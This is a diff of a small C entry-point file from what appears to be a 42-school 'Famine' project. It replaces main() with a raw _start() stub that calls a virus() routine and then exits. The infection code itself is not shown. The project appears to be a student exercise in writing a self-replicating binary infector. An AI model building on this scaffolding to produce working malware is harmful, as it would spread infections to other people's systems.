@@ -1,17 +1,21 @@
 /* ************************************************************************** */
 /*                                                                            */
 /*                                                        :::      ::::::::   */
-/*   famine.c                                           :+:      :+:    :+:   */
+/*   main.c                                             :+:      :+:    :+:   */
 /*                                                    +:+ +:+         +:+     */
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
-/*   Created: 2019/06/04 00:21:46 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/06/04 00:22:47 by agrumbac         ###   ########.fr       */
+/*   Created: 2019/06/04 03:39:28 by agrumbac          #+#    #+#             */
+/*   Updated: 2019/06/07 07:23:16 by agrumbac         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
-int	main(void)
+#include "famine.h"
+#include "syscall.h"
+
+int	_start(void)
 {
-	famine();
-	return (0);
+	virus();
+	famine_exit(0);
+	__builtin_unreachable();
 }
